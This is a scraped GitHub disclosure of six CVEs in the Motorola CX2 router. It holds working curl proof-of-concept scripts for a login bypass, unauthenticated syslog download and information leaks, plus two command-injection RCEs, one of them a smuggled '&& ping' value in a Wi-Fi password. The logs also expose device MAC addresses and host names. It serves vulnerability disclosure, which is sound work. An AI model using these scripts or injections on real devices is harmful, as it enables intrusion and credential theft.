   An issue was discovered in Moto route CX2 1.0.2. An attacker could perform a command injection to execute arbitrary system command on the router by HNAP1/SetWLanApcliSettings in repeat mode.

   **Reproduce**

   1. Switch router to repeater mode
   2. Click extend wireless network
      [![ ](https://camo.githubusercontent.com/0732e7503b8a95d3a60120e3a9c7dc2cf57ab3bcd0085eab7cb919852e6a701b/687474703a2f2f306437643032656363653234636534636533363566656537396336346131623633396238393465322e6f73732d636e2d71696e6764616f2e616c6979756e63732e636f6d2f383638343532616466356666656334623434383433373034333062346665343630643233656332612e6a7067)](https://camo.githubusercontent.com/0732e7503b8a95d3a60120e3a9c7dc2cf57ab3bcd0085eab7cb919852e6a701b/687474703a2f2f306437643032656363653234636534636533363566656537396336346131623633396238393465322e6f73732d636e2d71696e6764616f2e616c6979756e63732e636f6d2f383638343532616466356666656334623434383433373034333062346665343630643233656332612e6a7067)
   3. Input SSID
   4. Inject command in password
      [![ ](https://camo.githubusercontent.com/191965375c5236164b6fadaaa8cb12a0deb47a0abe5f2b0951027608720d6c2d/687474703a2f2f306437643032656363653234636534636533363566656537396336346131623633396238393465322e6f73732d636e2d71696e6764616f2e616c6979756e63732e636f6d2f623839633339643263653165333265393338336431333564363833376165633536663438663337642e6a7067)](https://camo.githubusercontent.com/191965375c5236164b6fadaaa8cb12a0deb47a0abe5f2b0951027608720d6c2d/687474703a2f2f306437643032656363653234636534636533363566656537396336346131623633396238393465322e6f73732d636e2d71696e6764616f2e616c6979756e63732e636f6d2f623839633339643263653165333265393338336431333564363833376165633536663438663337642e6a7067)
   5. Submit
   6. And the router will return an error at the first time. Ignore it.
   7. Submit again
      [![ ](https://camo.githubusercontent.com/9230409aac5f26b7f90e45855ca67892ef6533f3d7278075edafac45f461742a/687474703a2f2f306437643032656363653234636534636533363566656537396336346131623633396238393465322e6f73732d636e2d71696e6764616f2e616c6979756e63732e636f6d2f376362663831393732646462316233393535363232316664616139653166663862306432333331632e6a7067)](https://camo.githubusercontent.com/9230409aac5f26b7f90e45855ca67892ef6533f3d7278075edafac45f461742a/687474703a2f2f306437643032656363653234636534636533363566656537396336346131623633396238393465322e6f73732d636e2d71696e6764616f2e616c6979756e63732e636f6d2f376362663831393732646462316233393535363232316664616139653166663862306432333331632e6a7067)
      The result is shown in this way because I already obtain the root shell you could check it in any way. The injection happened in the command `/bin/sh -c iwpriv apclix0 set ApCliWPAPSK=&& ping www.baidu.com`

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f6736a75_20250119_133657.html ===
# Motorola CX2 router vulnerabilities
CVE-2020-21937
CVE-2020-21936
CVE-2020-21935
CVE-2020-21934
CVE-2020-21933
CVE-2020-21932
## Description
This router is a Motorola brand sale by Soplar.
More information could be found here.
## Version
CX 1.0.2 Build 20190508 Rel.97360n
## Reporter
cc-crack
## Vulnerabilities
All env variables referenced in POC code defined as:
```bash
HOST='Host: 192.168.51.1'
Origin='Origin: http://192.168.51.1'
HNAP\_AUTH='HNAP\_AUTH: '
CT='Content-Type: application/json; charset=UTF-8'
XR='X-Requested-With: XMLHttpRequest'
ACCEPT='Accept: application/json, text/javascript, \*/\*; q=0.01'
SOAP\_ACTION\_HEAD='SOAPAction: "http://purenetworks.com/HNAP1/Login"'
Referer='Referer: http://192.168.51.1/Login.html'
DEFAULT\_COOKIE='Cookie: work\_mode=router; timeout=170; uid=; PrivateKey='
PRAGMA='Pragma: no-cache'
REQUEST\_LOGIN\_DATA='{"Login":{"Action":"request","Username":"Admin","LoginPassword":"","Captcha":"","PrivateLogin":"LoginPassword"}}'
LOGIN\_DATA='{"Login":{"Action":"login","Username":"Admin","LoginPassword":"","Captcha":"","PrivateLogin":"LoginPassword"}}'
COOKIE=$DEFAULT\_COOKIE
TIME\_STAMPE=""
HNAP\_AUTH\_POST=""
```
Some of them maybe are useless, they just are a part of some other test code.
1. Login could be bypassed
\*\*Description\*\*:
An issue was discovered in Moto route CX2 1.0.2. The login could be bypassed to get a partially authorized token and uid.
\*\*Reproduce\*\*:
You should install jq first. eg: `sudo apt install jq`
```bash
#login
function Login
{
c=$(curl -s -H $HOST -H $Origin -H $HNAP\_AUTH -H 'SOAPAction: "http://purenetworks.com/HNAP1/Login"' -H 'Referer: http://192.168.51.1/Login.html' -H $DEFAULT\_COOKIE --data-binary $REQUEST\_LOGIN\_DATA --compressed 'http://192.168.51.1/HNAP1/' > out.txt && cat out.txt | jq .LoginResponse.Cookie)
uid=${c:1:8}
setCooikeUID $uid
echo $COOKIE
curl -H $HOST -H $Origin -H $HNAP\_AUTH -H 'SOAPAction: "http://purenetworks.com/HNAP1/Login"' -H 'Referer: http://192.168.51.1/Login.html' -H $COOKIE --data-binary $LOGIN\_DATA --compressed 'http://192.168.51.1/HNAP1/'
}
Login
echo '\n'
```
```bash
╰─○ ./poc.sh
Cookie: work\_mode=router; timeout=170; uid=WA9rYkub; PrivateKey=
{ "LoginResponse": { "LoginResult": "OK" } }
```
2. /HNAP1/GetDownLoadSyslog authentication bypass
\*\*Description\*\*:
An issue was discovered in Moto route CX2 1.0.2. The authentication of Syslog download could be bypassed.
\*\*Reproduce\*\*:
```bash
function getLog
{
curl -s -H $HOST -H $Origin \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3' \
-H 'Referer: http://192.168.51.1/Diagnosis.html' \
-H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7' \
-H $COOKIE -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' \
--data "" \
--compressed 'http://192.168.51.1/HNAP1/prog.fcgi?method=/HNAP1/GetDownLoadSyslog' > $1
}
Login
echo '\n'
getLog log.tar.gz
ls -al log.tar.gz
```
```bash
╰─○ ./poc.sh
Cookie: work\_mode=router; timeout=170; uid=MVS/fLm8; PrivateKey=
{ "LoginResponse": { "LoginResult": "OK" } }
-rw-r--r-- 1 \*\*\*\*\*\*\* staff 30168 Jul 1 08:18 log.tar.gz
```
3. Plain text password and Private key exist in the log file
\*\*Description\*\*:
An issue was discovered in Moto route CX2 1.0.2. The Admin password and the private key could be found in the log tar package which could download from router.
\*\*Reproduce\*\*:
```bash
function checkPlainPassword
{
zgrep -a password $1
zgrep -a key $1
zgrep -a cipher $1
}
Login
echo '\n'
getLog log.tar.gz
ls -al log.tar.gz
checkPlainPassword log.tar.gz
```
```bash
╰─○ ./poc.sh
Cookie: work\_mode=router; timeout=170; uid=tuCPveI1; PrivateKey=
{ "LoginResponse": { "LoginResult": "OK" } }
-rw-r--r-- 1 \*\*\*\*\*\*\* staff 33516 Jul 1 08:26 log.tar.gz
Jun 22 08:43:41 OpenWrt local5.info prog-cgi[1352]: [Management] Changing login password
Jun 24 18:05:15 OpenWrt local5.info prog-cgi[1382]: [Management] Changing login password
Jun 24 18:47:38 OpenWrt local5.info prog-cgi[1382]: [Management] Changing login password
Jun 24 18:05:15 OpenWrt local0.debug prog-cgi[1382]: modules/management.c:SetPasswdSettings:1506:query:{"SetPasswdSettings":{"system\_root\_password":"d139a32b6c3c3e606540fb1f727f1172e2c7a32bb53c3e1e6540a237727cb872e2c7a32bb53c3e1e6540a237727cb872e2c7a32bb53c3e1e6540a23772
Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: modules/management.c:CheckPasswdSettings:1554:query:{"CheckPasswdSettings":{"system\_root\_password":"76c7bad3fd9ab2b0784e29d9ed02b5e64d39bad3b39ab297784e96deed6362e64d39bad3b39ab297784e96deed6362e64d39bad3b39ab297784e96
Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: modules/management.c:SetPasswdSettings:1506:query:{"SetPasswdSettings":{"system\_root\_password":"c734d3d377b1da4295f84a4b7b4587144d39bad3b39ab297784e96deed6362e64d39bad3b39ab297784e96deed6362e64d39bad3b39ab297784e96deed
Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:BUc0Gfvupo4X62H0ASoYThisIsAPlainPWD1,challenge:nGoIBN1rpVQDxStUxO74
Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:3B011AE9D2319AB2BC6D711E1E72D10B
Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:BUc0Gfvupo4X62H0ASoY
Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:BUc0Gfvupo4X62H0ASoY
Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:itciZG60noEYbkQaUFlaThisIsAPlainPWD1,challenge:5FgQIbPNWXtwU42z7DIW
Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:799DC71A8181A52E0DBBE2E39C85085F
Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:itciZG60noEYbkQaUFla
Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:itciZG60noEYbkQaUFla
Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:Ull6GghC8VTbTq40ZHNoThisIsAPlainPWD1,challenge:vvjmI2JW9UmYwRJdkbYB
Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:36A275799C92F7B311E01BF576517A5C
Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:Ull6GghC8VTbTq40ZHNo
Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:Ull6GghC8VTbTq40ZHNo
Jun 24 18:05:15 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:BUc0Gfvupo4X62H0ASoY
Jun 24 18:05:15 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:3B011AE9D2319AB2BC6D711E1E72D10B
Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:RB9IFIIg364kYw6uhaqaThisIsAPlainPWD,challenge:hT1Mc3tBr2Z5NjvnmAo7
Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:D46691831DB0DE88CC198097055BDA33
Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:RB9IFIIg364kYw6uhaqa
Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:RB9IFIIg364kYw6uhaqa
Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:o/t5PqsZc7CFH19RaiTJThisIsAPlainPWD,challenge:llM58p29REvF3l/FwsbN
Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:2EF1CC5A66D79D3A228B3CCCF0B2A88F
Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:o/t5PqsZc7CFH19RaiTJ
Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:o/t5PqsZc7CFH19RaiTJ
Jun 24 18:12:16 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:itciZG60noEYbkQaUFla
Jun 24 18:12:16 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:799DC71A8181A52E0DBBE2E39C85085F
Jun 24 18:19:07 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:Ull6GghC8VTbTq40ZHNo
Jun 24 18:19:07 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:36A275799C92F7B311E01BF576517A5C
Jun 24 18:20:21 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:RB9IFIIg364kYw6uhaqa
Jun 24 18:20:21 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:D46691831DB0DE88CC198097055BDA33
Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:LO6LPeH0qkHht8o+JgBYThisIsAPlainPWD,challenge:+zj7TNy2B3ntMvrq/d5c
Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:D71E06255E5A26C22A65BC881FCCEEBA
Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:LO6LPeH0qkHht8o+JgBY
Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:LO6LPeH0qkHht8o+JgBY
Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:o/t5PqsZc7CFH19RaiTJ
Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:2EF1CC5A66D79D3A228B3CCCF0B2A88F
Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:MaFu3VbiMk5DVOCrdDGPThisIsAPlainPWD,challenge:+ZXL3PEzRDfHKXvHZ9OI
Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:54BB74CD7DC276242EAA6763327BC543
Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:MaFu3VbiMk5DVOCrdDGP
Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:MaFu3VbiMk5DVOCrdDGP
Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:P4m26q6ot+NCaUHyS/o0ThisIsAPlainPWD,challenge:R2NJKpaugV46y/JDUaOC
Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:F2CFA5FAB1BB395A7CFB7B21F741758F
Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:P4m26q6ot+NCaUHyS/o0
Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:P4m26q6ot+NCaUHyS/o0
Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:OVsXJVQTjGzQ1sZD8QDvThisIsAPlainPWD,challenge:OE0w522nsn4DaQExFZxg
Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:C03AD43494AEBCDF60FEE04B85CD9370
Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:OVsXJVQTjGzQ1sZD8QDv
Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:OVsXJVQTjGzQ1sZD8QDv
Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:lUuoCMB0eFB+EPcwWGu2ThisIsAPlainPWD,challenge:RUDDgwrOZEX7dA3+Saso
Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:00CCA8E72DD21BAED65E6A0FA39DF1FF
Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:lUuoCMB0eFB+EPcwWGu2
Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:lUuoCMB0eFB+EPcwWGu2
Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:uHWjy/Ys2HDRq6jKrTRLThisIsAPlainPWD,challenge:homSb7E24Aec76z9ls2L
Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:79D30570F08507DB08CFBB087FD7BD0B
Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:uHWjy/Ys2HDRq6jKrTRL
Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:uHWjy/Ys2HDRq6jKrTRL
Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:LO6LPeH0qkHht8o+JgBY
Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:D71E06255E5A26C22A65BC881FCCEEBA
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:GVH1s7hqhun2w3WbV1jWThisIsAPlainPWD,challenge:4qwIQ99dMHPyJWMhlsK6
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:650035854B5BAB9CC137C0F553B63EA9
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:GVH1s7hqhun2w3WbV1jW
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:GVH1s7hqhun2w3WbV1jW
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:MaFu3VbiMk5DVOCrdDGP
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:54BB74CD7DC276242EAA6763327BC543
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:P4m26q6ot+NCaUHyS/o0
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:F2CFA5FAB1BB395A7CFB7B21F741758F
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:OVsXJVQTjGzQ1sZD8QDv
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:C03AD43494AEBCDF60FEE04B85CD9370
Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:lUuoCMB0eFB+EPcwWGu2
Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:00CCA8E72DD21BAED65E6A0FA39DF1FF
Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1272:publickey:GVH1s7hqhun2w3WbV1jW
Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: security.c:safe\_free\_NODE:1273:privatekey:650035854B5BAB9CC137C0F553B63EA9
Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:Oj/0G/EUmcyTSF1TOWswThisIsAPlainPWD,challenge:7ikeZOGlrnYLCYh0PGIx
Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey\_buf:B00B2523A61FDB5F8C1BF157C14ADAA1
Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2764:publickey:Oj/0G/EUmcyTSF1TOWsw
Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH\_ResponseHandler:2766:publickey:Oj/0G/EUmcyTSF1TOWsw
Jun 24 15:45:20 OpenWrt kern.warn kernel: [ 32.212000] wtc\_acquire\_groupkey\_wcid: Found a non-occupied wtbl\_idx:125 for WDEV\_TYPE:1
Jun 24 15:45:25 OpenWrt kern.warn kernel: [ 36.860000] wtc\_acquire\_groupkey\_wcid: Found a non-occupied wtbl\_idx:124 for WDEV\_TYPE:1
Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD1
Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD1
Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD1
Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
```
As you can see the cipher filed is the admin password in plain text. There are private keys logged in hex string as well.
4. GetStationSettings, GetWebsiteFilterSettings and GetNetworkSettings could be accessed unauthenticated via HNAP1/GetMultipleHNAPs
\*\*Description\*\*:
HNAP1/GetMultipleHNAPs could be accessed unauthenticated but to some methods that lead to the information leakage.
I notice that HNAP1/GetMultipleHNAPs maybe designed to allow unauthenticated access. But there is the sensitive information returned by some method. Like the following result, the parent\_control\_rule should not be obtained in this case.
All of HNAP1/GetMultipleHNAPs access should be authenticated.
\*\*Reproduce\*\*:
```bash
function getRouterBasicInfo
{
curl -H $HOST \
-H 'Accept: application/json' \
-H $Origin -H 'SOAPACTION: "http://purenetworks.com/HNAP1/GetMultipleHNAPs"' \
-H 'Content-Type: application/json' -H 'Referer: http://192.168.51.1/Home.html' -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7' \
-H 'Pragma: no-cache' \
-H 'Cache-Control: no-cache' \
--data-binary '{"GetMultipleHNAPs":{"GetStationSettings":"","GetWebsiteFilterSettings":"","GetNetworkSettings":""}}' \
--compressed 'http://192.168.51.1/HNAP1/'
}
getRouterBasicInfo
```
```json
{
"GetMultipleHNAPsResponse": {
"GetStationSettingsResponse": {
"wire\_sta\_list": "00:3e:e1:c4:ff:95,192.168.51.143,tester,2019-06-24 20:06:16,615,0,Apple Inc.",
"wireless\_sta\_2g\_list": "",
"wireless\_sta\_2g\_guest\_list": "",
"wireless\_sta\_5g\_list": "",
"wireless\_sta\_5g\_guest\_list": "",
"offline\_sta\_list": "00:e0:4c:6c:27:6b,192.168.51.195,MacBook-Pro,2019-06-06 13:52:18,,0,null;a0:99:9b:0e:b8:b9,192.168.51.215,securisecs-MBP,2017-09-08 18:21:17,,1,Apple Inc.;f0:18:98:39:d1:2a,192.168.51.240,MacBook-Pro,2019-06-24 15:44:02,,2,null;f4:cb:52:95:7f:82,192.168.51.222,192.168.51.222,2019-05-30 20:55:35,,1,HUAWEI TECHNOLOGIES CO. LTD;80:e6:50:0e:09:ea,192.168.51.140,\*\*\*\*\*\*\*s-MacPro,2019-06-03 07:23:15,,2,Apple Inc.;50:64:2b:0f:a7:f2,192.168.51.100,192.168.51.100,2019-06-03 07:58:35,,0,XIAOMI Electronics CO. LT;68:8f:84:05:a1:f5,192.168.51.137,192.168.51.137,2019-06-03 07:58:36,,0,HUAWEI TECHNOLOGIES CO. LTD;00:3e:e1:c3:74:80,192.168.51.168,\*\*\*\*\*\*\*dePro,2019-06-06 19:10:38,,0,Apple Inc.;00:3e:e1:c4:ff:94,192.168.51.142,\*\*\*\*\*\*\*MacPro,2019-06-09 14:39:38,,0,Apple Inc.;b8:63:4d:23:2c:f6,192.168.51.200,\*\*\*\*\*\*\*-Main,2019-06-20 19:36:58,,2,Apple Inc.",
"wireless\_maclist\_mode": "ojbk",
"wireless\_maclist": "123,123123123",
"GetStationSettingsResult": "OK"
},
"GetWebsiteFilterSettingsResponse": {
"parent\_control\_rule": "1,,a0:99:9b:0e:b8:b9,1,testtest.org,00:00:00,23:59:00,Mon",
"GetWebsiteFilterSettingsResult": "OK"
},
"GetNetworkSettingsResponse": {
"lan(0)\_mac": "E4:90:7E:F8:38:F4",
"lan(0)\_ipaddr": "192.168.51.1",
"lan(0)\_netmask": "255.255.255.0",
"lan(0)\_dhcps\_enable": "1",
"lan(0)\_dhcps\_start": "100",
"lan(0)\_dhcps\_end": "249",
"lan(0)\_dhcps\_lease": "1440m",
"GetNetworkSettingsResult": "OK"
},
"GetMultipleHNAPsResult": "OK"
}
}
```
5. HNAP1/GetNetworkTomographySettings RCE
\*\*Description\*\*
An issue was discovered in Moto route CX2 1.0.2. An attacker could perform a command injection to execute arbitrary system command on the router by HNAP1/GetNetworkTomographySettings.
\*\*Reproduce\*\*
1. Login first
2. Bypass browser side input validation. I just use Tampermonkey to inject a piece of JS code while accessing Diagnosis. Or you can free to use any proxy tools like burp.
```javascript
// ==UserScript==
// @name New Userscript
// @namespace http://tampermonkey.net/
// @version 0.1
// @description try to take over the world!
// @author You
// @match http://192.168.51.1/Diagnosis.html
// @grant none
// ==/UserScript==
(function() {
'use strict';
verifyDiagnisInput = function(){
return true;
}
})();
```
3. submit command
![ ](http://0d7d02ecce24ce4ce365fee79c64a1b639b894e2.oss-cn-qingdao.aliyuncs.com/583979d440fd4a5acc4bef411653c4f61c53ee98.jpg)
6. HNAP1/SetWLanApcliSettings RCE
\*\*Description\*\*
An issue was discovered in Moto route CX2 1.0.2. An attacker could perform a command injection to execute arbitrary system command on the router by HNAP1/SetWLanApcliSettings in repeat mode.
\*\*Reproduce\*\*
1. Switch router to repeater mode
2. Click extend wireless network
![ ](http://0d7d02ecce24ce4ce365fee79c64a1b639b894e2.oss-cn-qingdao.aliyuncs.com/868452adf5ffec4b4484370430b4fe460d23ec2a.jpg)
3. Input SSID
4. Inject command in password
![ ](http://0d7d02ecce24ce4ce365fee79c64a1b639b894e2.oss-cn-qingdao.aliyuncs.com/b89c39d2ce1e32e9383d135d6837aec56f48f37d.jpg)
5. Submit
6. And the router will return an error at the first time. Ignore it.
7. Submit again
![ ](http://0d7d02ecce24ce4ce365fee79c64a1b639b894e2.oss-cn-qingdao.aliyuncs.com/7cbf81972ddb1b39556221fdaa9e1ff8b0d2331c.jpg)
The result is shown in this way because I already obtain the root shell you could check it in any way. The injection happened in the command ```/bin/sh -c iwpriv apclix0 set ApCliWPAPSK=&& ping www.baidu.com```

